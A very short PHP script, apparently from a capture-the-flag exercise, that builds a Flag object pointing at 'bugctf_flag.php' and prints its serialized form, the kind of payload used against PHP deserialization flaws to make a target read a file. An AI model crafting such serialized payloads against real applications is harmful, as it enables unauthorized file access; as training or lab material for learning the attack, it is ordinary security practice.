<?php
class Flag{
    public $file='bugctf_flag.php';
}
$a=new Flag();
$b=serialize($a);
echo $b;
?>